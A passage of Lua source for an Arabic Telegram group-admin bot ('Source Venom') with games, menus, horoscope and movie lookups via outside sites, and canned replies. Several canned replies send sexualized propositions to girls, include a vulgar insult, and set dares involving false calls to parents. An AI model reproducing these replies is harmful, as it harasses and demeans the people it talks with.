if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n* 𖥔 لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,' 𖥔 ليس لديك نقاط في الالعاب\n 𖥔 اذا كنت تريد ربح نقاط \n 𖥔 ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n 𖥔 ليس لديك نقاط في هذه لعبه \n 𖥔 لزيادة نقاطك في اللعبه \n 𖥔 ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,' 𖥔 تم خصم * ↚ { '..NUMPY..' }* من نقاطك \n 𖥔 وتم اضافة*  ↚ { '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end
if text == 'فحص البوتت' and Manager(msg) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '✔️' else info = '✖' end
if Json_Info.result.can_delete_messages == true then
delete = '✔️' else delete = '✖' end
if Json_Info.result.can_invite_users == true then
invite = '✔️' else invite = '✖' end
if Json_Info.result.can_pin_messages == true then
pin = '✔️' else pin = '✖' end
if Json_Info.result.can_restrict_members == true then
restrict = '✔️' else restrict = '✖' end
if Json_Info.result.can_promote_members == true then
promote = '✔️' else promote = '✖' end 
send(msg.chat_id_,msg.id_,'\n 𖥔 اهلا عزيزي البوت هنا ادمن'..'\n 𖥔 وصلاحياته هي ↓ \n━━━━━━━━━━'..'\n 𖥔 تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n 𖥔 مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n 𖥔 حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n 𖥔 دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n 𖥔 تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n 𖥔 اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end


if text and text:match("^تغير رد المطور (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد المطور (.*)$") 
database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," 𖥔 تم تغير رد المطور الى  ↚ "..Teext)
end
if text and text:match("^تغير رد المالك (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد المالك (.*)$") 
database:set(bot_id.."CoSu:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," 𖥔 تم تغير رد المالك الى  ↚ "..Teext)
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد منشئ الاساسي (.*)$") 
database:set(bot_id.."BasicConstructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," 𖥔 تم تغير رد المنشئ الاساسي الى  ↚ "..Teext)
end
if text and text:match("^تغير رد المنشئ (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد المنشئ (.*)$") 
database:set(bot_id.."Constructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," 𖥔 تم تغير رد المنشئ الى  ↚ "..Teext)
end
if text and text:match("^تغير رد المدير (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد المدير (.*)$") 
database:set(bot_id.."Manager:Rd"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_," 𖥔 تم تغير رد المدير الى  ↚ "..Teext)
end
if text and text:match("^تغير رد الادمن (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد الادمن (.*)$") 
database:set(bot_id.."Mod:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," 𖥔 تم تغير رد الادمن الى  ↚ "..Teext)
end
if text and text:match("^تغير رد المميز (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد المميز (.*)$") 
database:set(bot_id.."Special:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," 𖥔 تم تغير رد المميز الى  ↚ "..Teext)
end
if text and text:match("^تغير رد الـعـضو  (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد الـعـضو  (.*)$") 
database:set(bot_id.."Memp:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," 𖥔 تم تغير رد الـعـضو  الى  ↚ "..Teext)
end

if text and text:match("^(.*)$") then
if database:get(bot_id..'help'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help'..msg.sender_user_id_)
database:set(bot_id..'help_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help1'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help1'..msg.sender_user_id_)
database:set(bot_id..'help1_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help2'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help2'..msg.sender_user_id_)
database:set(bot_id..'help2_text',text)
return false
end
end

if text and text:match("^(.*)$") then
if database:get(bot_id..'help3'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help3'..msg.sender_user_id_)
database:set(bot_id..'help3_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help4'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help4'..msg.sender_user_id_)
database:set(bot_id..'help4_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help5'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help5'..msg.sender_user_id_)
database:set(bot_id..'help5_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help6'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help6'..msg.sender_user_id_)
database:set(bot_id..'help6_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help7'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help7'..msg.sender_user_id_)
database:set(bot_id..'help7_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help8'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help8'..msg.sender_user_id_)
database:set(bot_id..'help8_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help9'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help9'..msg.sender_user_id_)
database:set(bot_id..'help9_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help10'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' 𖥔 تم حفظ الكليشه')
database:del(bot_id..'help10'..msg.sender_user_id_)
database:set(bot_id..'help10_text',text)
return false
end
end

if text == 'استعاده الاوامر' and Devban(msg) then
database:del(bot_id..'help_text')
database:del(bot_id..'help1_text')
database:del(bot_id..'help2_text')
database:del(bot_id..'help3_text')
database:del(bot_id..'help4_text')
database:del(bot_id..'help5_text')
database:del(bot_id..'help6_text')
database:del(bot_id..'help7_text')
database:del(bot_id..'help8_text')
database:del(bot_id..'help9_text')
database:del(bot_id..'help10_text')
send(msg.chat_id_, msg.id_, ' 𖥔 تم استعادة الاوامر القديمه')
end
if text == 'تغير امر الاوامر' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه الاوامر')
database:set(bot_id..'help'..msg.sender_user_id_,'true')
return false 
end
if text == 'تغير امر ⓵' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه ⓵')
database:set(bot_id..'help1'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر⓶' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه⓶')
database:set(bot_id..'help2'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر ⓷' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه ⓷')
database:set(bot_id..'help3'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر⓸' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه⓸')
database:set(bot_id..'help4'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر ⓹' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه ⓹')
database:set(bot_id..'help5'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر ⓺' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه ⓺')
database:set(bot_id..'help6'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر اوامر التسليه' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه اوامر التسليه')
database:set(bot_id..'help7'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر اوامر مطور البوت' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔  الان يمكنك ارسال الكليشه اوامر مطور البوت')
database:set(bot_id..'help8'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر اوامر مطور الاساسي' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه اوامر مطور الاساسي')
database:set(bot_id..'help9'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر اوامر الاعضاء' and Devban(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 الان يمكنك ارسال الكليشه اوامر الاعضاء')
database:set(bot_id..'help10'..msg.sender_user_id_,'true')
return false 
end
---------------------- الاوامر الجديدة
if text == 'الاوامر' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 هذا الامر خاص بي\n الادمن ، المطور الاساسي ، المدير ، المطور الثانوي\n ، المطور ، المدير عام ، الادمن العام ، المنشئ\n ارسل 「اوامر الاعضاء」لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔لا تستطيع استخدام البوت \n 𖥔يرجى الاشتراك بالقناه اولا \n 𖥔اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Text =[[
𖥔 اهلا بك في قسم الاوامر ..↑↓
اختر الامر الذي تريدها .↑↓
ده من الازرار بلاسفل . ↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '◗اوامر المطورين◖', callback_data="/help5"},{text = '◗اوامر التسليه◖', callback_data="/help7"},
},
{
{text = '◗اوامر الاعضاء◖', callback_data="/help6"},
},
{
{text = '◗اوامر التعطيل◖', callback_data="/help2"},{text = '◗اوامر القفل◖', callback_data="/help1"},
},
{
{text = '•تــغــير الــلــغــه•', callback_data="/help90"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----------------------------------------------------------------------------
if text == 'الالعاب' then
local Text = [[
 اهلا بك في قسم الالعاب ..↑↓
 اختر العبه الذي تريدها .↑↓
ده من الازرار بلاسفل . ↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '◗العاب السورس◖', callback_data="/mute-name"},{text = '◗الاضافات◖', callback_data="/change-photo"},
},
{
{text = '◗ متطوره◖', callback_data="/VNO"},
},
{
{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/35&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'امر الـعـضو ' or text == 'اوامر الأعضاء' or text == 'اوامر الاعضاء' then
local Text = [[
 اتبع الاوامر الاعضاء
 تحت لي في الزر الأسفل↓
 
 ..
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'اوامر الاعضاء', callback_data="/change-names"},
},
{
{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'اصنع يوزر' or text == 'اصنع' then
local Text = [[
-اختار يوزرك من الأسفل-
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '@jjjx33', callback_data="/jjjx33"},{text = '@Xccp', callback_data="/Xccp"},
},
{
{text = '@Lj_llIll', callback_data="/Lj_llIll"},{text = '@pivsn', callback_data="/pivsn"},
},
{
{text = '•@k1op', callback_data="/k1op"},{text = '@Q10d', callback_data="/Q10d"},
},
{
{text = '@llll_iiij', callback_data="/llll_iiij"},{text = '@Xjak', callback_data="/Xjak"},
},
{
{text = '@Xjljlj', callback_data="/Xjljlj"},{text = '@jk1bn', callback_data="/jk1bn"},
},
{
{text = '@A0op', callback_data="/A0op"},{text = '@vip_iij', callback_data="/vip_iij"},
},
{
{text = '@iii_llij', callback_data="/iii_llij"},{text = '@YtIIIl', callback_data="/YtIIIl"},
},
{
{text = '@hjljilj', callback_data="/hjljilj"},{text = '@vbvy', callback_data="/vbvy"},
},
{
{text = '@Diiolk', callback_data="/Diiolk"},{text = '@Bi01j', callback_data="/Bi01j"},
},
{
{text = '@frrili', callback_data="/frrili"},{text = '@Xcvb', callback_data="/Xcvb"},
},
{
{text = '@Dlik', callback_data="/Dlik"},
},
{
{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مريم' then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖥔 مريم  معطله") 
return false  
end
local Text = [[
🥀اطفي النور واستمتع بلعبه •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'حسنا', callback_data="/may"},{text = 'تست', callback_data="/GPhah"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/37&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if Text == '/GPhah' then
local Teext =[[
شيء لا يمشي إلا بالضرب فمن يكون؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تست', callback_data="/Karen"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagePhoto?chat_id='..Chat_id..'&photo=https://t.me/Qtdao/41&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if text == 'اسالني' or text == 'اختار' or text == 'لغز' or text == 'الغاز' then
local Text = [[
⍆ هل انت جهاز للعب ⍆
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ابدا العب', callback_data="/guitar"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'اختبار الذكاء' or text == 'نسبه الذكاء' then
local Text = [[
رجل اشترى جهاز كهربائي بخصم 20% من إجمالي قيمة الجهاز، وهي نسبة تساوي 150 ريال؟.ما هي قيمة الجهاز؟.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '600', callback_data="/verp"},{text = '700', callback_data="/plling"},
},
{
{text = '550', callback_data="/pullin"},{text = '237', callback_data="/pulng"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/38&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'الابراج' then
local Text = [[
• أختر برجك عزيزي •📮،⍆
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• الاسد ،🦁', callback_data="/zking"},{text = '• الثور 🐂', callback_data="/zzor"},
},
{
{text = '• العقرب 🦂', callback_data="/zakrb"},{text = '• القوس 🏹', callback_data="/zkos"},
},
{
{text = '• الحمل 🐐', callback_data="/zBanda"},
},
{
{text = '• السرطان 🦀', callback_data="/zsltan"},{text = '• العذراء 🦋', callback_data="/zazra"},
},
{
{text = '• الميزان ⚖', callback_data="/zmezan"},{text = '• الجدي 🦌', callback_data="/zgagy"},
},
{
{text = ' معرفة برجك 🧭', callback_data="/zporg"},
},
{
{text = '• الحوت 🐋', callback_data="/zhot"},
},
{
{text = '• الجوزاء 🌩', callback_data="/zguza"},{text = '• الدلو 🦯', callback_data="/zdlu"},
},
{
{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/36&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

----------------------------------------------------------------- انتهئ الاوامر الجديدة
if text == "تعطيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 تم تعطيل الابراج')
database:set(bot_id.." ban:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تفعيل الابراج')
database:set(bot_id.." ban:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." ban:brj_Bots"..msg.chat_id_) == "open" then
local Textbrj = text:match("^برج (.*)$")
gk = https.request('https://rudi-dev.tk/Amir2/Boyka.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
for k,v in pairs(br.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 تم تعطيل حساب العمر')
database:set(bot_id.." ban:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 تم تعطيل حساب العمر')
database:set(bot_id.." ban:age_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تفعيل حساب العمر')
database:set(bot_id.." ban:age_Bots"..msg.chat_id_,"open")
end

if text and not database:get(bot_id.."AutoFile") then
Time = database:get(bot_id.."AutoFile:Time")
if Time then 
if Time ~= os.date("%x") then  
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'VENOM Chat'
link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
CoSu = database:smembers(bot_id..'CoSu'..v)
ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
MNSH = database:smembers(bot_id..'Constructor'..v)
MDER = database:smembers(bot_id..'Manager'..v)
MOD = database:smembers(bot_id..'Mod:User'..v)
if k == 1 then
t = t..'"'..v..'":{"VENOM":"'..NAME..'",'
else
t = t..',"'..v..'":{"VENOM":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(SUDO, msg.id_,0, 1, nil, './'..bot_id..'.json', '𖥔 عدد مجموعات التي في البوت { '..#list..'}')
database:set(bot_id.."AutoFile:Time",os.date("%x"))
end
else 
database:set(bot_id.."AutoFile:Time",os.date("%x"))
end
end


if text and text:match("^احسب (.*)$") and database:get(bot_id.." ban:age_Bots"..msg.chat_id_) == "open" then
local Textage = text:match("^احسب (.*)$")
ge = https.request('https://rudi-dev.tk/Amir3/Boyka.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
for k,v in pairs(ag.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "تعطيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 تم تعطيل الافلام')
database:set(bot_id.."ban:movie_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تفعيل الافلام')
database:set(bot_id.."ban:movie_bot"..msg.chat_id_,"open")
end
if text and text:match("^فلم (.*)$") and database:get(bot_id.."ban:movie_bot"..msg.chat_id_) == "open" then
local Textm = text:match("^فلم (.*)$")
data,res = https.request('https://forhassan.ml/Black/movie.php?serch='..URL.escape(Textm)..'')
if res == 200 then
getmo = json:decode(data)
if getmo.Info == true then
local Text ='قصه الفلم'..getmo.info
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مشاهده الفلم بجوده 240',url=getmo.sd}},
{{text = 'مشاهده الفلم بجوده 480', url=getmo.Web},{text = 'مشاهده الفلم بجوده 1080', url=getmo.hd}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if text == "رد عليه يابوت" or text == "رد عليه" or text == "در انت يابوت" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ولد ولا بنت 🤓"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "عقاب" or text == "قول عقاب" or text == "العقاب" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"قل لواحد ماتعرفه عطني كف 🧸","🧸سو مشهد تمثيلي عن مصرية بتولد","🧸صور اي شيء يطلبه منك الاعبين","🧸البس طرحه امك او اختك ","🧸لا خلاص معتش في سمحتك"," 🧸اتصل لاخوك و قول له انك سويت حادث و الخ....","🧸تكلم باللغة الانجليزية الين يجي دورك مرة ثانية لازم تتكلم اذا ما تكلمت تنفذ عقاب ثاني","🧸تروح عند شخص تقول له ","🧸 اتصل على ابوك و قول له انك رحت مع بنت و احين هي حامل....","🧸اتصل على امك و قول لها انك ","🧸اذا انت ولد اكسر اغلى او احسن عطور عندك اذا انتي بنت اكسري الروج حقك او الميك اب حقك"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "بنت" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"اي ي جامده تعي بف هاتي رقمك وهكلمك بليل ي وتكه انتي هاتي بوسه💋😉","اي ي جامده متجبي بوسه ولا اقولك هاتي رقمك اكلمك واتس واخلي بابا يتجوزك😉💋🤸‍♂","ي بت كلمي بابا عايزك بف وابعتي رقمك ها بابا بيحبك 💋❤️🤍🤸‍♂🤸‍♂😉","يعم دي اقل من اني اديها رقمي 😎😜"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "تفعيل مريم"  then
if Constructor(msg) then  
database:set(bot_id.."my_maryam:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖥔 تـم تـفعـيل مريم") 
return false  
end
end

if text == "تعطيل مريم"  then
if Constructor(msg) then  
database:del(bot_id.."my_maryam:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," 𖥔 تـم تـعـطـيل مريم") 
return false end
end

if text == "ولد" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"دا عيل بيضااان","ولا بطيقه اصلا","اقل من اني افكر فيه","كسمو مش حوار"," ظريط سيببك منو"," يعم دا حكاك هتعمل عقلك بي","يابا دا اقل من انك ترد عليه","فكك منه م يستاهلش","احظره واريخ دماغي؟!!"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "بتحبو" or text == "بتحب دا" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"طبعا دا قلبي ♥🙄"," هحب فيه اي دا😹🙂","تؤ محصلش😹"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "بتكره دا" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"دا عيل بيضااان","ولا بطيقه اصلا","اقل من اني افكر فيه"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هينه" or text == "رزله" or text == "هيني" or text == "رزلي" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"يابا دا اقل من انك ترد عليه","فكك منه م يستاهلش","احظره واريخ دماغي؟!! "}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "مصه" or text == "بوسه" or text == "بوسي" or text == "مصي" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مووووووووواححح💋","الوجه ميساعد😒","تؤ مش ادام الناس😉","لا عيب","يوهه بتكثف🙄","مش بايس حد انا"}send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == 'روابط الحذف' or text == 'رابط  حذف' or text == 'رابط الحذف' then
local Text = [[
مواقع  مسح حسابات،🛰️
فكر قبل لا تتسرع وتروح
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Telegram',url="https://my.telegram.org/auth?to=delete"}},
{{text = 'instagram', url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}}, 
{{text = 'Facebook', url="https://www.facebook.com/help/deleteaccount"}}, 
{{text = 'Snspchat', url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/yhu79/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
